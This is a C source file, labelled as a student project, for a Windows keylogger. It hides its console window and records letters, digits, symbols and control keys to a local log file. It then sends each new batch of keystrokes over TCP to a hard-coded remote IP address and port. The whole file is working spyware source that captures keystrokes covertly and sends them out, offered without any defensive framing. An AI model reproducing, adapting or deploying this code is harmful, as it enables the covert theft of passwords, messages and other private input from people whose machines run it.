/* Student Project- Giorgi Aptsiauri, 820968337 */
// disables deprecated API warnings
#define _CRT_SECURE_NO_DEPRECATE
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <stdio.h>
#include<winsock2.h>				//	for the server
#pragma comment(lib,"ws2_32.lib")	//	Winsock Library
#include <stdlib.h>					
#ifndef _WIN32_WINNT				//	for hiding
#define _WIN32_WINNT 0x0500			//	the console
#endif
#include <windows.h>	//	defines GetAsyncKeyState and GetKeyState functions
#include <io.h>			//	and provides constants for particulat keys
#include <stdbool.h>

void logAlphKeyPresses(short characterPressed, FILE* logFilePtr);		//	process alphabetical characters (English letters)
void logNums(short characterPressed, FILE* logFilePtr);					//	process number keys above the alphanumeric keys
void printNumSpecialChars(short characterPressed, FILE* logFilePtr);	//	process special characters on the numbers keys abobe the alphanumeric keys
void logFKeys(FILE* logFilePtr);										//	process F keys, f1, f2, f3, ... , f12
void essentialCtrChars(FILE* logFilePtr);								//	process control keys like Enter, Ctrl, Alt, ESC, Backspace, etc.
void numKeysHandler(FILE* logFilePtr);									//	process numpad keys
void establishConnection(SOCKET* sock);

int main()
{
	// hide the console window (from Stack Overflow, check references)
	HWND hWnd = GetConsoleWindow();
	// it seems like it won't hide the windows unless minimized
	ShowWindow(hWnd, SW_MINIMIZE);
	ShowWindow(hWnd, SW_HIDE);

	short charPressed = 0;	// short is large enough to hold a single character
	FILE* logPtr;

	//	establish the connection to the logging server
	SOCKET sock;
	establishConnection(&sock);

	char buffer[50];		//	characters will be stored here before sending
	int c;	//	a character will be stored here before writing it to buffer
	int size = 0;	//	for the byte seinding mechanism, explained later
	int sizeCompared = 0;	//	also for the byte seinding mechanism

	int i = 0;	// for various iterations

				//	to keep the program running under all conditions
	while (1)
	{
		Sleep(5);		// slow down the loop execution
		fopen_s(&logPtr, "log.txt", "a+");	// open a log file
		if (logPtr == NULL)  /* just a sanity check */
		{
			perror("File couldn't open...");
			return 1;
		}

		//	set the file position indicator to the END. 
		fseek(logPtr, 0L, SEEK_END);
		//	record the size of the file. It corresponds to the number of characters in the file
		//	this will be used to assess whether a character(s) was/ were written to the file
		size = ftell(logPtr);

		/*	these "magic numbers" correspond to uppercase
		letters in ASCII code. This loop deals with
		alphabetical letters
		*/
		for (charPressed = 65; charPressed < 91; charPressed++)
		{
			logAlphKeyPresses(charPressed, logPtr);
		}

		/*
		48-to-58 correspond to numbers
		*/
		for (charPressed = 48; charPressed < 58; charPressed++)
		{
			logNums(charPressed, logPtr);
		}

		// f1, f2, ... , f12 keys
		logFKeys(logPtr);

		// keys like Ctrl, Alt, Enter...
		essentialCtrChars(logPtr);

		// handle numpad keys
		numKeysHandler(logPtr);

		// upload the key strokes to the server
		sizeCompared = ftell(logPtr);	// retrieve new size of the log file (in bytes)

		if (sizeCompared > size)	// execute only if a character(s) is/are added in thie iteration
		{
			/* set the file position indicator as many places to the left
			as the number of characters have been added
			*/
			fseek(logPtr, (size - sizeCompared), SEEK_END);
			i = 0;
			//	get each consecutive key in char c and write to buffer
			while ((c = fgetc(logPtr)) != EOF)
			{
				buffer[i] = c;
				i++;
			}
			//	terminate the string
			buffer[i] = '\0';
			//	just for demonstrational purpose, if one wants to see the keys presses on the screen
			printf("%s", buffer);
			//	send the buffer to the server
			send(sock, buffer, sizeof(buffer), 0);
		}
		//	close the file
		fclose(logPtr);
	}
	return 0;
}

//	log lower-case and upper-case letters
void logAlphKeyPresses(short characterPressed, FILE* logFilePtr)
{
	//	record the states of the key pressed, whether the CAPS LOCK is toggled,
	//	and is shift is presses in real time
	bool keyState = (GetAsyncKeyState(characterPressed) & 0x0001),
		capsLockState = (GetKeyState(VK_CAPITAL) & 0x0001),
		shiftState = GetAsyncKeyState(VK_SHIFT) & 0x8000;
	if (keyState) {
		if (!((!(shiftState) && capsLockState)		// XOR
			|| ((shiftState) && !capsLockState)))	// Relation
		{
			//	the relationship of SHIFT and CAPS LOCK is XOR logic
			//	keyboard prints UPPER-CASE letters iff either of it is toggled/pressed
			fprintf(logFilePtr, "%c", characterPressed + 32); // (A, B, C, ... Y, Z)
		}
		else
		{
			//	otherwise, a lower-case letter is printed. In this case, written to a file
			fprintf(logFilePtr, "%c", characterPressed);	// (a, b, c, ... y, z)
		}
	}
}

//	log numbers, print special chars if shift is presses
void logNums(short characterPressed, FILE* logFilePtr)
{
	//	record the state of the key pressed and whether shift is presses in real time 
	bool keyState = (GetAsyncKeyState(characterPressed) & 0x0001),
		shiftState = GetAsyncKeyState(VK_SHIFT) & 0x8000;

	if (keyState)
	{
		if (!(shiftState))
		{
			//	if shift is not presses, print nums (1, 2, 3, 4, ... 8, 9)
			fprintf(logFilePtr, "%c", characterPressed);
		}
		else
		{
			//	otherwise the special characters under them. (!@#$%^&*())
			printNumSpecialChars(characterPressed, logFilePtr);
		}
	}
}

//	the function which deals with (!@#$%^&*()) characters
void printNumSpecialChars(short characterPressed, FILE* logFilePtr)
{
	//	if the key is pressed, go ahead and check which one it is
	//	and write the appropriate char to the file
	switch (characterPressed)
	{
	case 48:
		fprintf(logFilePtr, ")");
		break;
	case 49:
		fprintf(logFilePtr, "!");
		break;
	case 50:
		fprintf(logFilePtr, "@");
		break;
	case 51:
		fprintf(logFilePtr, "#");
		break;
	case 52:
		fprintf(logFilePtr, "$");
		break;
	case 53:
		fprintf(logFilePtr, "%%");
		break;
	case 54:
		fprintf(logFilePtr, "^");
		break;
	case 55:
		fprintf(logFilePtr, "&");
		break;
	case 56:
		fprintf(logFilePtr, "*");
		break;
	case 57:
		fprintf(logFilePtr, "(");
		break;
	}
}

//	write to a file, if an f key was pressed (f1, f2, f3, ... f11, f12)
void logFKeys(FILE* logFilePtr)
{
	//	since Windows virtual codes for f keys are consecutively enumerated,
	//	a for loop is used which decreased the size of the code
	char f[12][10] = { { "[f1 key]" },{ "[f2 key]" },{ "[f3 key]" },{ "[f4 key]" },
	{ "[f5 key]" },{ "[f6 key]" },{ "[f7 key]" },{ "[f8 key]" },{ "[f9 key]" },
	{ "[f10 key]" },{ "[f11 key]" },{ "[f12 key]" } };
	for (int i = 0x70; i <= 0x7B; i++)
	{
		if ((GetAsyncKeyState(i) & 0x0001))
		{
			fprintf(logFilePtr, "%s", f[i - 0x70]);
		}
	}
}

//	this will log control keys
void essentialCtrChars(FILE* logFilePtr)
{
	if ((GetAsyncKeyState(VK_TAB) & 0x0001))
	{
		fprintf(logFilePtr, "[TAB]");
	}

	if ((GetAsyncKeyState(VK_BACK) & 0x0001))
	{
		fprintf(logFilePtr, "[BACKSPACE]");
	}

	if ((GetAsyncKeyState(VK_LCONTROL) & 0x0001))
	{
		fprintf(logFilePtr, "[LEFT_CONTROL]");
	}

	if ((GetAsyncKeyState(VK_RCONTROL) & 0x0001))
	{
		fprintf(logFilePtr, "[RIGHT_CONTROL]");
	}

	if ((GetAsyncKeyState(VK_CAPITAL) & 0x0001))
	{
		fprintf(logFilePtr, "[CAPS_LOCK]");
	}

	if ((GetAsyncKeyState(VK_LMENU) & 0x0001))
	{
		fprintf(logFilePtr, "[LEFT_ALT]");
	}

	if ((GetAsyncKeyState(VK_RMENU) & 0x0001))
	{
		fprintf(logFilePtr, "[RIGHT_ALT]");
	}

	if ((GetAsyncKeyState(VK_SPACE) & 0x0001))
	{
		fprintf(logFilePtr, " ");
	}

	if ((GetAsyncKeyState(VK_OEM_2) & 0x0001))
	{
		if (GetAsyncKeyState(VK_SHIFT) & 0x8000)
		{
			fprintf(logFilePtr, "?");
		}
		else
		{
			fprintf(logFilePtr, "/");
		}
	}

	if ((GetAsyncKeyState(VK_OEM_1) & 0x0001))
	{
		if (GetAsyncKeyState(VK_SHIFT) & 0x8000)
		{
			fprintf(logFilePtr, ":");
		}
		else
		{
			fprintf(logFilePtr, ";");
		}
	}

	if ((GetAsyncKeyState(VK_OEM_PLUS) & 0x0001))
	{
		if (GetAsyncKeyState(VK_SHIFT) & 0x8000)
		{
			fprintf(logFilePtr, "+");
		}
		else
		{
			fprintf(logFilePtr, "=");
		}
	}

	if ((GetAsyncKeyState(VK_OEM_COMMA) & 0x0001))
	{
		if (GetAsyncKeyState(VK_SHIFT) & 0x8000)
		{
			fprintf(logFilePtr, "<");
		}
		else
		{
			fprintf(logFilePtr, ",");
		}
	}

	if ((GetAsyncKeyState(VK_OEM_MINUS) & 0x0001))
	{
		if (GetAsyncKeyState(VK_SHIFT) & 0x8000)
		{
			fprintf(logFilePtr, "_");
		}
		else
		{
			fprintf(logFilePtr, "-");
		}
	}

	if ((GetAsyncKeyState(VK_OEM_PERIOD) & 0x0001))
	{
		if (GetAsyncKeyState(VK_SHIFT) & 0x8000)
		{
			fprintf(logFilePtr, ">");
		}
		else
		{
			fprintf(logFilePtr, ".");
		}
	}

	if ((GetAsyncKeyState(VK_OEM_3) & 0x0001))
	{
		if (GetAsyncKeyState(VK_SHIFT) & 0x8000)
		{
			fprintf(logFilePtr, "~");
		}
		else
		{
			fprintf(logFilePtr, "`");
		}
	}

	if ((GetAsyncKeyState(VK_OEM_4) & 0x0001))
	{
		if (GetAsyncKeyState(VK_SHIFT) & 0x8000)
		{
			fprintf(logFilePtr, "{");
		}
		else
		{
			fprintf(logFilePtr, "[");
		}
	}

	if ((GetAsyncKeyState(VK_OEM_5) & 0x0001))
	{
		if (GetAsyncKeyState(VK_SHIFT) & 0x8000)
		{
			fprintf(logFilePtr, "|");
		}
		else
		{
			fprintf(logFilePtr, "\\");
		}
	}

	if ((GetAsyncKeyState(VK_OEM_6) & 0x0001))
	{
		if (GetAsyncKeyState(VK_SHIFT) & 0x8000)
		{
			fprintf(logFilePtr, "}");
		}
		else
		{
			fprintf(logFilePtr, "]");
		}
	}

	if ((GetAsyncKeyState(VK_OEM_7) & 0x0001))
	{
		if (GetAsyncKeyState(VK_SHIFT) & 0x8000)
		{
			fprintf(logFilePtr, "\"");
		}
		else
		{
			fprintf(logFilePtr, "'");
		}
	}

	if ((GetAsyncKeyState(VK_LBUTTON) & 0x0001))
	{
		fprintf(logFilePtr, "[LMB]");
	}

	if ((GetAsyncKeyState(VK_RBUTTON) & 0x0001))
	{
		fprintf(logFilePtr, "[RMB]");
	}

	if ((GetAsyncKeyState(VK_MBUTTON) & 0x0001))
	{
		fprintf(logFilePtr, "[MMB]");
	}

	if ((GetAsyncKeyState(VK_ESCAPE) & 0x0001))
	{
		fprintf(logFilePtr, "[ESC]");
	}

	if ((GetAsyncKeyState(VK_PRIOR) & 0x0001))
	{
		fprintf(logFilePtr, "[PAGE_UP]");
	}

	if ((GetAsyncKeyState(VK_NEXT) & 0x0001))
	{
		fprintf(logFilePtr, "[PAGE_DOWN]");
	}

	if ((GetAsyncKeyState(VK_END) & 0x0001))
	{
		fprintf(logFilePtr, "[END]");
	}

	if ((GetAsyncKeyState(VK_HOME) & 0x0001))
	{
		fprintf(logFilePtr, "[HOME]");
	}

	if ((GetAsyncKeyState(VK_LEFT) & 0x0001))
	{
		fprintf(logFilePtr, "[LAK]");
	}

	if ((GetAsyncKeyState(VK_UP) & 0x0001))
	{
		fprintf(logFilePtr, "[UAK]");
	}

	if ((GetAsyncKeyState(VK_RIGHT) & 0x0001))
	{
		fprintf(logFilePtr, "[RAK]");
	}

	if ((GetAsyncKeyState(VK_DOWN) & 0x0001))
	{
		fprintf(logFilePtr, "[DAK]");
	}

	if ((GetAsyncKeyState(VK_SELECT) & 0x0001))
	{
		fprintf(logFilePtr, "[SELECT]");
	}

	if ((GetAsyncKeyState(VK_PRINT) & 0x0001))
	{
		fprintf(logFilePtr, "[PRINT]");
	}

	if ((GetAsyncKeyState(VK_SNAPSHOT) & 0x0001))
	{
		fprintf(logFilePtr, "[SCREENSHOT]");
	}

	if ((GetAsyncKeyState(VK_INSERT) & 0x0001))
	{
		fprintf(logFilePtr, "[INSERT]");
	}

	if ((GetAsyncKeyState(VK_DELETE) & 0x0001))
	{
		fprintf(logFilePtr, "[DELETE]");
	}

	if ((GetAsyncKeyState(VK_MULTIPLY) & 0x0001))
	{
		fprintf(logFilePtr, "*");
	}

	if ((GetAsyncKeyState(VK_ADD) & 0x0001))
	{
		fprintf(logFilePtr, "+");
	}

	if ((GetAsyncKeyState(VK_SEPARATOR) & 0x0001))
	{
		fprintf(logFilePtr, "[SEPARATOR]");
	}

	if ((GetAsyncKeyState(VK_SUBTRACT) & 0x0001))
	{
		fprintf(logFilePtr, "-");
	}

	if ((GetAsyncKeyState(VK_DECIMAL) & 0x0001))
	{
		fprintf(logFilePtr, ".");
	}

	if ((GetAsyncKeyState(VK_DIVIDE) & 0x0001))
	{
		fprintf(logFilePtr, "/");
	}
}

//	log NUM pad keys
void numKeysHandler(FILE* logFilePtr)
{
	bool numLockState = (GetKeyState(VK_NUMLOCK) & 0x0001);
	if (numLockState)
	{
		for (int i = 0; i <= 9; i++)
		{
			if (!(GetAsyncKeyState(VK_SHIFT) & 0x8000))
			{
				if (GetAsyncKeyState(0x60 + i) & 0x0001)
				{
					fprintf(logFilePtr, "%d", i);
				}
			}
		}
	}
}

//	to establish connection
//	The core of this code from BinaryTides website (check references)
void establishConnection(SOCKET* sock)
{
	// this socket code is from
	WSADATA wsa;
	struct sockaddr_in server;

	printf("\nInitialising Winsock...");
	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
	{
		printf("Failed. Error Code : %d", WSAGetLastError());
	}
	printf("Initialised.\n");

	//	Create a socket for connection. TCP protocol is used
	if ((*sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
	{
		printf("Could not create socket : %d", WSAGetLastError());
	}
	printf("Socket created.\n");

	//	store the server info which we are connecting to
	server.sin_addr.s_addr = inet_addr("159.89.26.242");
	server.sin_family = AF_INET;   
	server.sin_port = htons(8888);

	//	Connect to remote server
	if (connect(*sock, (struct sockaddr *)&server, sizeof(server)) < 0)
	{
		puts("connect error");
	}
	puts("Connected");
}